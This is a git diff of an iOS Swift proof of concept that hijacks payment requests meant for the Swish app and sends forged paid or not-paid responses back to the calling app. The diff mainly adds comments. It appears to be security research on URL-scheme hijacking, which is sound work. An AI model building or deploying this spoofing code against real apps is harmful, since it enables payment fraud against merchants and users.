@@ -6,6 +6,9 @@
 //
 
 import UIKit
+/**
+ Custom radiobutton class
+ */
 class RadioButton: UIButton {
     var alternateButton:Array<RadioButton>?
     override func awakeFromNib() {
@@ -48,7 +51,9 @@ class RadioButton: UIButton {
         }
     }
 }
+
 class ViewController: UIViewController {
+    // Button for sending payment reponse back to caller
     private let button:  UIButton={
         let button = UIButton()
         button.backgroundColor = .systemRed
@@ -72,6 +77,7 @@ class ViewController: UIViewController {
         super.viewDidLoad()
         // Do any additional setup after loading the view.
         let width = self.view.frame.width
+        // Add top menu bar
         let navigationBar: UINavigationBar = UINavigationBar(frame: CGRect(x: 0, y: 20, width: width, height: 40))
         navigationBar.backgroundColor = .opaqueSeparator
         self.view.addSubview(navigationBar)
@@ -82,18 +88,20 @@ class ViewController: UIViewController {
         button.frame = CGRect(x: view.frame.width/2-100, y:view.frame.height-100, width: 200, height: 50)
         button.addTarget(self, action: #selector(sendResponse), for: .touchUpInside)
         
-        var paymentInfoLabel = UILabel.init(frame:CGRect(x: 20, y:150, width: 200, height: 50))
+        let paymentInfoLabel = UILabel.init(frame:CGRect(x: 20, y:150, width: 200, height: 50))
         paymentInfoLabel.text = "Hijacked Payment Info"
         paymentInfoLabel.textAlignment = .center
         paymentInfoLabel.font = paymentInfoLabel.font.withSize(20)
 
-
-        //paymentInfoLabel.backgroundColor = .darkGray
         view.addSubview(paymentInfoLabel)
         
         addTextFields()
         addRadioButtons()
     }
+    /**
+     Sends fake payment reponse back to the app that tried to open the Swish app.
+     Constructs a reponse url schema based on Swish's App2App API.
+     */
     @objc func sendResponse(){
         if phoneNrTxtField.text == "" || phoneNrTxtField.text == nil{
             return
@@ -102,6 +110,7 @@ class ViewController: UIViewController {
         if notPaidButton.isSelected{
             result = "notpaid"
         }
+        // Construct response url scheme
         var fakeSwishResponse: String = callbackUrl!;
         fakeSwishResponse += "?";
         fakeSwishResponse += callbackParam!;
@@ -115,9 +124,8 @@ class ViewController: UIViewController {
         fakeSwishResponse += phoneNrTxtField.text!
         fakeSwishResponse += "%22,%22version%22:2%7D"
         
-        print(fakeSwishResponse)
-        let appUrl = URL(string: fakeSwishResponse)
-        
+        let appUrl = URL(string: fakeSwishResponse) // convert to url
+        // If appurl is valid, open the app
         if UIApplication.shared.canOpenURL(appUrl! as URL) {
             UIApplication.shared.open(appUrl!)
         } else {
@@ -129,7 +137,9 @@ class ViewController: UIViewController {
         paidButton.isSelected = true
         notPaidButton.isSelected = false
     }
-    
+    /**
+     Add textfields which displays the hijacked payment information
+     */
     func addTextFields(){
         
         phoneNrTxtField.borderStyle = UITextField.BorderStyle.line
@@ -173,7 +183,9 @@ class ViewController: UIViewController {
         messageTxtField.isUserInteractionEnabled = false
         view.addSubview(messageTxtField)
     }
-    
+    /**
+     Add radiobuttons for selecting payment status to be included with the reponse.
+     */
     func addRadioButtons(){
         
         let paidLabel = UILabel(frame: CGRect(x:80,y:view.frame.height-235,width:40,height:40))
@@ -204,7 +216,10 @@ class ViewController: UIViewController {
         notPaidButton.alternateButton = [paidButton]
         
     }
-    
+    /**
+     Converts the data incoming from a payment request and display them in
+     textfields on screen.
+     */
     func handlePaymentRequest(url: URL){
         let components = URLComponents(
                         url: url,
@@ -212,7 +227,6 @@ class ViewController: UIViewController {
                     )!
         
         let paymentInfoJson: String? = components.queryItems?.first(where: {$0.name == "data"})?.value
-        print(paymentInfoJson)
         let data = Data(paymentInfoJson.unsafelyUnwrapped.utf8)
         let decoder = JSONDecoder()
         let paymentInfo = try? decoder.decode(PaymentInfo.self, from: data);
